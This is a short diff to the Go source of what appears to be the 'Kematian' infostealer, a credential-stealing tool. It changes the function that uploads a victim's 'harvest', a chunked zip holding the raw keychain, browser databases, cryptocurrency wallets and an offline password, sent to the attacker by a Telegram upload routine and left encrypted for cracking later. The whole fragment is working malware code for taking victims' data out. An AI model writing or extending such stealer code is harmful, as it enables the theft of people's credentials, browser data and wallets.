@@ -45,13 +45,14 @@ func uploadAllHarvest(cfg uploadConfig, hostname string, p *harvestPayload, quie
 	return uploadVictimTelegram(cfg, baseFilename, p, quiet)
 }
 
-// uploadPrimaryHarvest builds and posts the priority zip (logs + wallets + env).
+// uploadPrimaryHarvest builds and posts the priority zip:
+// raw keychain + browser DBs + wallets + offline password + meta (no on-box decrypt).
 func uploadPrimaryHarvest(cfg uploadConfig, baseFilename string, p *harvestPayload, maxChunk int, quiet bool) error {
 	chunks, err := buildPrimaryZipChunks(p, maxChunk)
 	if err != nil {
 		return err
 	}
-	return uploadZipChunks(cfg, baseFilename, "Kematian harvest", harvestSummary(p), chunks, "harvest", quiet)
+	return uploadZipChunks(cfg, baseFilename, "Kematian offline-crack harvest", harvestSummary(p), chunks, "harvest", quiet)
 }
 
 // uploadScannedFiles posts phase-2 bulk files (documents/images/other).
